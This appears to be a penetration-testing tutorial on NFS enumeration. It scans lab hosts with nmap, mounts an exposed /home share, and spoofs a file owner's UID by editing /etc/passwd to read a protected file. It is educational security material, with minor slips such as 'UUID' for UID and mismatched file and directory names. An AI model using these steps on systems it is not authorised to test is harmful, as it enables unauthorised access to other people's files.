---
description: Methodologies for enumerating NFS systems on a network
---

# NFS Enumeration

Network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems in 1984. It allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage.

NFS is often used with UNIX operating systems and is predominantly insecure in its implementation. It can be somewhat difficult to set up securely, so it's not uncommon to find NFS shares open to the world. This is quite convenient for penetration testers, as they might be able to leverage them to collect sensitive information, escalate privileges, and so forth.

## Scanning for NFS Services

Both **Portmapper** and **RPCbind** run on TCP port 111.&#x20;

RPCbind maps RPC services to the ports on which they listen. RPC processes notify rpcbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve.

The client system then contacts rpcbind on the server with a particular RPC program number. The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.

Can use NSE scripts like `rpcinfo` to find services that may have registered with rpcbind:

```
kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
...
Nmap scan report for 10.11.1.72
Host is up (0.0055s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      50255/udp  mountd
|   100005  1,2,3      56911/tcp  mountd
|   100021  1,3,4      40160/udp  nlockmgr
|   100021  1,3,4      57765/tcp  nlockmgr
|   100024  1          34959/udp  status
|   100024  1          46908/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
...
```

## Examining NFS Shares

Once NFS services have been found to be running, additional enumeration can be done.

### Nmap Scripts

Nmap provides a few scripts for NFS enumeration:

```bash
kali@kali:~$ ls /usr/share/nmap/scripts/ | grep nfs
/usr/share/nmap/scripts/nfs-ls.nse
/usr/share/nmap/scripts/nfs-showmount.nse
/usr/share/nmap/scripts/nfs-statfs.nse
```

#### Example

It is possible to run all of these against a target with `--script nfs*`:

```
kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
...
Nmap scan report for 10.11.1.72

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /home 10.11.0.0/255.255.0.0
```

In this example /home is being used and can thus be mounted on the attacker's machine:

```bash
kali@kali:~$ mkdir home

kali@kali:~$ sudo mount -o nolock 10.11.1.72:/home ~/home/

kali@kali:~$ cd home/ && ls
jenny  joe45  john  marcus  ryuu
```

* `mount` is used to mount the drive as if it were local
  * `-o nolock` is an option to disable file locking
    * Often needed on older NFS servers

Based on this file listing, attackers can see that there are a few home directories for local users on the remote machine. Digging a bit deeper, they find a filename that catches their attention, so they try to view it:

```bash
kali@kali:~/home$ cd marcus

kali@kali:~/home/marcus$ ls -la
total 24
drwxr-xr-x 2 1014  1014 4096 Jun 10 09:16 .
drwxr-xr-x 7 root root 4096 Sep 17  2015 ..
-rwx------ 1 1014  1014   48 Jun 10 09:16 creds.txt

kali@kali:~/home/marcus$ cat creds.txt
cat: creds.txt: Permission denied
```

Digging a bit deeper one might notice that `cred.txt` is owned by a user with a UUID of 1014. This file is on a remote system (that is mounted locally). Given that the attacker has complete control over the local machine they can try to:

1. Create a user on their local machine with UUID 1014
   * In actuality they can create a user (which will likely have a UUID that is different from 1014) and then just change its UUID
2. Attempt to open the remote file as the local user with UUID of 1014
   * Hopefully this will trick the remote server into believing it is the "correct" (i.e. user on the remote system) user with UUID 1014

```bash
kali@kali:~/home/stefan$ sudo adduser pwn
Adding user `pwn' ...
Adding new group `pwn' (1001) ...
Adding new user `pwn' (1001) with group `pwn' ...
Creating home directory `/home/pwn' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for pwn
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n]
```

Based on this output, the user created has UUID of 1001 (which is incorrect). This can be edited with `sed`:

```bash
kali@kali:~/home/marcus$ sudo sed -i -e 's/1001/1014/g' /etc/passwd

kali@kali:~/home/marcus$ cat /etc/passwd | grep pwn
pwn:x:1014:1014:,,,:/home/pwn:/bin/bash
```

Now this user can be leveraged to access the file on the NFS system:

```bash
kali@kali:~/home/marcus$ su pwn

pwn@kali:/root/home/marcus$ id
uid=1014(pwn) gid=1014 groups=1014

pwn@kali:/root/home/marcus$ cat creds.txt
Not what you are looking for, try harder!!!
```

In this example, the attacker is successfully able to trick the NFS system into allowing the file to be read and edited. Unfortunately there is nothing useful here.
